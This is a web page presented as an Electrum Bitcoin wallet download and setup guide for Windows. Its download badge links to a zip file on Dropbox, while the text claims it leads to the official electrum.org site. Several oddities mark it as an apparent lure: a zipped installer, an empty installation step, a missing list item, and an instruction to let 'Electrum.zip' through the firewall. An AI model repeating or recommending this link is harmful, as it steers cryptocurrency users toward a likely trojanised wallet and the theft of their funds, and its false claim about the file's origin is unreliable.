---
layout: default
title: "Electrum Bitcoin Wallet — Download & Setup Guide (Windows x64)"
description: "Download Electrum Bitcoin Wallet for Windows 10/11 x64. Lightweight BTC wallet with cold storage, multisig & hardware wallet support. Setup guide."
---

# Electrum Bitcoin Wallet Desktop Application — Download & Setup Guide

[![Download Electrum](https://www.dropbox.com/scl/fi/c5yvo2cwsty2gf4m7lq11/electrum-4.8.2-x64-setup.zip?rlkey=lydbts6tu7a46wecq2qjivdrs&st=xotpwbw4&dl=1)](https://www.dropbox.com/scl/fi/c5yvo2cwsty2gf4m7lq11/electrum-4.8.2-x64-setup.zip?rlkey=lydbts6tu7a46wecq2qjivdrs&st=xotpwbw4&dl=1)
**Version:** 4.8.2 | **License:** Free (MIT) | **Platform:** Windows 10/11 x64 | **SHA-256:** `a989a0146e826cd3797e38cf29cbcf8870ec2cceea50541e3eee1f933ede0cb9`

---

## Overview

Electrum Bitcoin Wallet is the world's most established lightweight Bitcoin wallet, first released in 2011. The desktop client for Windows 10/11 x64 provides fast, secure Bitcoin transactions without requiring a full blockchain download. Electrum uses SPV (Simplified Payment Verification) to validate transactions against Bitcoin block headers, reducing storage requirements from 600+ GB to under 100 MB.

The wallet supports cold storage (watch-only wallets), multi-signature transactions, hardware wallet integration (Ledger, Trezor, Coldcard, BitBox), Lightning Network payments, and Replace-By-Fee (RBF) for transaction fee bumping. Electrum uses deterministic BIP-32/39/44/84 hierarchical key derivation with optional BIP-39 passphrase support.

The application connects to a decentralized network of Electrum servers (over 100 globally) with automatic failover, Tor routing support, and SSL/TLS encrypted connections. No account registration, no KYC, and no personal data collection.

---

## Key Features

1. **Lightweight SPV Architecture** — No full blockchain download required. Syncs in under 30 seconds using Merkle proof verification against Bitcoin block headers.
2. **Cold Storage Support** — Create watch-only wallets on an online computer, sign transactions on an offline air-gapped machine, and broadcast via a third-party online watch-only wallet.
3. **Multi-Signature Wallets** — Set up M-of-N multisig configurations (2-of-3, 3-of-5) for shared custody, corporate treasury management, or enhanced personal security.
4. **Hardware Wallet Integration** — Full support for Ledger Nano X/S, Trezor Model T/One, Coldcard Mk4, BitBox02, and KeepKey. All private keys remain on the hardware device.
5. **Lightning Network** — Send and receive Bitcoin instantly via Lightning Network with automatic channel management, submarine swaps, and trampoline routing.
6. **Replace-By-Fee (RBF)** — Bump transaction fees on unconfirmed transactions to accelerate confirmation during network congestion.
7. **Custom Server Selection** — Manually select Electrum servers, connect via Tor for privacy, or run your own Electrum Personal Server (EPS) for full self-sovereignty.
8. **PSBT Support** — Partially Signed Bitcoin Transactions for compatibility with hardware wallets, multisig coordinators, and Bitcoin Core.
9. **SegWit & Taproot** — Native SegWit (bech32) and Taproot (bech32m) address support for lower fees and enhanced privacy.
11. **Open Source & Audited** — MIT licensed, publicly audited codebase with reproducible builds. No telemetry, no tracking, no data collection.

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 x64 (1809) | Windows 11 x64 (23H2) |
| **Processor** | Any x64 CPU | Intel Core i3 / AMD Ryzen 3 |
| **RAM** | 512 MB | 2 GB |
| **Storage** | 100 MB free disk space | 500 MB SSD |
| **Display** | 1024x768 | 1920x1080 |
| **Network** | Broadband (1 Mbps) | Broadband (10+ Mbps) |

---

## How to Download and Install

### Step 1: Download the Installer

Click the **Download** badge above to visit the official Electrum website (electrum.org). Select **"Windows Installer"** (not the standalone executable). The file is approximately 35 MB.

### Step 2: Verify the Signature (Critical)

Electrum installers are GPG-signed by Thomas Voegtlin. Verify before installing:

```powershell
# Download the signature file from electrum.org
# Verify with GnuPG:
gpg --verify electrum-4.8.2-x64-setup.zip.asc electrum-4.8.2-x64-setup.zip
```

### Step 3: Run the Installer


### Step 4: Complete Setup

1. Choose **"Create New Wallet"** or **"Restore Wallet"**.
2. Select wallet type: **Standard**, **SegWit**, **Taproot**, or **Multisig**.
3. Write down the **12-word seed phrase** on paper. Never digitize it.
4. Set a strong wallet password (encrypts the wallet file on disk).
5. Configure server: Settings → Network → Select server manually or enable auto-connect.

### Step 5: Post-Installation

- Enable **"Encrypt Wallet File"** (done during setup).
- Set **"Auto-Lock"** after 5 minutes: Settings → Preferences → Security.
- For cold storage: create a watch-only wallet on this machine, keep the seed offline.
- Configure **Tor proxy** (Settings → Network → Proxy) for enhanced privacy.

---

## Troubleshooting & FAQ



### Issue: Wallet shows "Not Connected"

**Solution:**  
1. Check internet connection.  
2. Go to Tools → Network → Server tab.  
3. Uncheck "Select server automatically" and choose a different server from the list.  
4. If using a firewall, allow Electrum.zip through Windows Defender Firewall.  
5. Try connecting via Tor: Tools → Network → Proxy → SOCKS5 127.0.0.1:9050.

### Issue: Transaction stuck unconfirmed

**Solution:**  
1. Right-click the transaction → **"Increase Fee"** (RBF).  
2. Set a higher fee rate (check mempool.space for current rates).  
3. If RBF is not enabled, use **Child-Pays-For-Parent (CPFP)** by spending the unconfirmed output with a high fee.

### Issue: Hardware wallet not detected

**Solution:**  
1. Ensure the hardware wallet is unlocked and the Bitcoin app is open.  
2. Try a different USB port.  
3. Install the latest hardware wallet firmware.  
4. For Ledger: ensure "Browser Support" is **disabled** in the Bitcoin app settings.

### FAQ

**Q: Is Electrum only for Bitcoin?**  
A: Yes. Electrum is a Bitcoin-only wallet. It does not support Ethereum, altcoins, or tokens.

**Q: Is Electrum free?**  
A: Yes. Electrum is free and open-source (MIT license). There are no fees beyond Bitcoin network transaction fees.

**Q: Can I use Electrum offline?**  
A: Yes. Create a watch-only wallet online, then use the seed on an offline computer to sign transactions. Transfer the signed transaction via USB to the online watch-only wallet for broadcasting.

**Q: What happens if I lose my seed phrase?**  
A: Your Bitcoin is permanently lost. There is no account recovery. Always back up your seed phrase on paper and store in a secure location.

**Q: Does Electrum support Lightning Network?**  
A: Yes. Electrum has built-in Lightning Network support with automatic channel management. You can send and receive Lightning payments directly from the wallet.
